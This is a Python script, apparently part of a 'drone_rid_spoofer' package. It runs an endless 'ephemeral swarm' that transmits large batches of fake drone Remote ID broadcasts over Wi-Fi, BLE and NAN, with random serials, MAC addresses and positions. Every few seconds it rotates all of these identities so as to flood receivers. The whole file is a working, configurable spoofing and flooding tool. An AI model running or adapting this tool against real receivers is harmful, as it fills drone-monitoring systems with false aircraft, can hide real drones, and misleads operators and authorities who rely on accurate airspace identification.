#!/usr/bin/env python3
"""
Ephemeral Swarm Experiment: Rapidly spawns batches of fake drone identities, 
transmits a tiny number of beacons per drone (e.g. 1 to 3 packets), and immediately
rotates MAC addresses, serial numbers, and locations to flood receivers with massive
numbers of distinct drone sessions across multiple physical transports simultaneously.
"""
import argparse
import logging
import sys
import time
from datetime import datetime

from drone_rid_spoofer.cli import create_backends, DEFAULT_LAT, DEFAULT_LNG
from drone_rid_spoofer.helpers import (
    ParseLocationAction,
    generate_ble_mac,
    generate_wifi_mac,
    get_random_pilot_location,
    get_random_serial_number,
    random_location,
    random_speed,
    random_vertical_speed,
    random_altitude,
    random_height,
)
from drone_rid_spoofer.messages import build_all_messages
from drone_rid_spoofer.state import DroneState

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s: %(message)s')


def seed_kinematics(drone: DroneState) -> None:
    drone.speed = float(random_speed())
    drone.vertical_speed = float(random_vertical_speed())
    drone.geodetic_altitude = float(random_altitude())
    drone.pressure_altitude = drone.geodetic_altitude
    drone.height = float(random_height())
    drone.direction = int(time.time() * 100) % 360


def generate_wave(count: int, base_lat: int, base_lng: int) -> list:
    drones = []
    for _ in range(count):
        serial = get_random_serial_number()
        lat, lng = random_location(base_lat, base_lng, 20000)  # ~2km random spread
        pilot_loc = get_random_pilot_location(lat, lng)
        mac_addr = generate_wifi_mac()
        ble_addr = generate_ble_mac()

        drone = DroneState(
            serial=serial,
            pilot_location=pilot_loc,
            lat=lat,
            lng=lng,
            mac_address=mac_addr,
            ble_address=ble_addr,
            mode="hover"
        )
        seed_kinematics(drone)
        drones.append(drone)
    return drones


# Default transport-specific batch sizes
DEFAULT_WIFI_BATCH = 100
DEFAULT_BLE_BATCH = 15
DEFAULT_NAN_BATCH = 15


def _classify_backend(backend) -> str:
    """Return the transport type string for a backend instance."""
    cls_name = type(backend).__name__.lower()
    if "wifi" in cls_name:
        return "wifi"
    elif "ble" in cls_name:
        return "ble"
    elif "nan" in cls_name:
        return "nan"
    return "wifi"


def _batch_size_for(transport_type: str, args: argparse.Namespace) -> int:
    """Return the batch size for a given transport type based on CLI arguments and defaults."""
    if transport_type == "wifi" and args.wifi_batch is not None:
        return args.wifi_batch
    elif transport_type == "ble" and args.ble_batch is not None:
        return args.ble_batch
    elif transport_type == "nan" and args.nan_batch is not None:
        return args.nan_batch

    if args.batch_size is not None:
        return args.batch_size

    defaults = {
        "wifi": DEFAULT_WIFI_BATCH,
        "ble": DEFAULT_BLE_BATCH,
        "nan": DEFAULT_NAN_BATCH,
    }
    return defaults.get(transport_type, DEFAULT_BLE_BATCH)


def main() -> None:
    parser = argparse.ArgumentParser(description="Ephemeral Swarm Injection (Rapid MAC/ID Rotation)")
    parser.add_argument("-t", "--transport", choices=["wifi", "ble", "nan", "both", "all"], default="wifi",
                        help="Transport medium(s) to broadcast on simultaneously (default: wifi)")
    parser.add_argument("-b", "--batch-size", type=int, default=None,
                        help="Override batch size for all active transports")
    parser.add_argument("--wifi-batch", type=int, default=None,
                        help=f"Wi-Fi specific batch size (default: {DEFAULT_WIFI_BATCH})")
    parser.add_argument("--ble-batch", type=int, default=None,
                        help=f"BLE specific batch size (default: {DEFAULT_BLE_BATCH})")
    parser.add_argument("--nan-batch", type=int, default=None,
                        help=f"NAN specific batch size (default: {DEFAULT_NAN_BATCH})")
    parser.add_argument("-d", "--wave-duration", type=float, default=3.0,
                        help="Duration in seconds each wave broadcasts before rotating identities (default: 3.0s)")
    parser.add_argument("-n", "--interval", type=float, default=0.2,
                        help="Transmission interval in seconds between packet cycles (default: 0.2s)")
    parser.add_argument("-l", "--location", nargs=2, metavar=("LATITUDE", "LONGITUDE"),
                        action=ParseLocationAction, default=(DEFAULT_LAT, DEFAULT_LNG),
                        help="Baseline GPS coordinates (decimal degrees)")
    parser.add_argument("-i", "--interface", default="wlan1",
                        help="Wi-Fi monitor interface (default: wlan1)")
    parser.add_argument("--ble-adapter", default="hci0",
                        help="BLE adapter name (default: hci0)")
    parser.add_argument("--ble-legacy", action="store_true",
                        help="Use BLE 4 Legacy Advertising only")
    parser.add_argument("--ble-dual", action="store_true",
                        help="Use dual broadcast of both BLE 4 and BLE 5")
    parser.add_argument("--nan-port", type=int, default=8080,
                        help="TCP port for NAN Android bridge (default: 8080)")
    parser.add_argument("--no-self-id", action="store_true", default=False,
                        help="Omit Self ID message to reduce packet overhead")
    parser.add_argument("--no-operator-id", action="store_true", default=False,
                        help="Omit Operator ID message")
    parser.add_argument("--wifi-channel", type=int, default=6,
                        help="Wi-Fi channel (default: 6)")
    args = parser.parse_args()

    logging.info(f"Starting Ephemeral Swarm on transport: [{args.transport.upper()}]")
    logging.info(f"Wave duration: {args.wave_duration}s | Tx interval: {args.interval}s")

    backends = create_backends(
        transport=args.transport,
        interface=args.interface,
        ble_adapter=args.ble_adapter,
        ble_interval=int(args.interval * 1000),
        ble_extended_interval=int(args.interval * 1000),
        ble_legacy=args.ble_legacy,
        ble_dual=args.ble_dual,
        wifi_ess=False,
        wifi_channel=args.wifi_channel,
        wifi_beacon_interval=args.interval,
        nan_port=args.nan_port,
        update_interval=args.interval
    )

    packet_builder = lambda drone: build_all_messages(
        drone,
        omit_self_id=args.no_self_id,
        omit_operator_id=args.no_operator_id
    )

    # Each backend gets its own drone list sized to its transport capacity
    backend_drone_lists = []
    for backend in backends:
        ttype = _classify_backend(backend)
        bsize = _batch_size_for(ttype, args)
        drones = generate_wave(bsize, args.location[0], args.location[1])
        backend_drone_lists.append(drones)
        backend.start(drones, packet_builder)
        logging.info(f"  [{ttype.upper()}] batch size: {bsize} drones")

    wave_count = 1
    total_unique_drones = sum(len(dl) for dl in backend_drone_lists)

    try:
        while True:
            logging.info(f"Wave #{wave_count}: Broadcasting {total_unique_drones} active identities across {len(backends)} transport(s)...")

            # Let the backend threads transmit for the configured wave duration
            time.sleep(args.wave_duration)

            # Rotate identities for each backend independently
            for idx, backend in enumerate(backends):
                ttype = _classify_backend(backend)
                bsize = _batch_size_for(ttype, args)
                old_wave = list(backend_drone_lists[idx])
                new_wave = generate_wave(bsize, args.location[0], args.location[1])

                # In-place atomic swap of active drone references for the backend broadcast thread
                backend_drone_lists[idx][:] = new_wave

                # Clean up tracking for expired drones
                for drone in old_wave:
                    backend.remove_drone(drone)

            wave_count += 1
            total_unique_drones += sum(len(dl) for dl in backend_drone_lists)

    except KeyboardInterrupt:
        logging.info(f"Ephemeral swarm interrupted by user. Injected {total_unique_drones} unique drone identities across {wave_count} waves.")
    finally:
        for backend in backends:
            backend.close()
        logging.info("All transport backends cleanly shut down.")


if __name__ == "__main__":
    main()
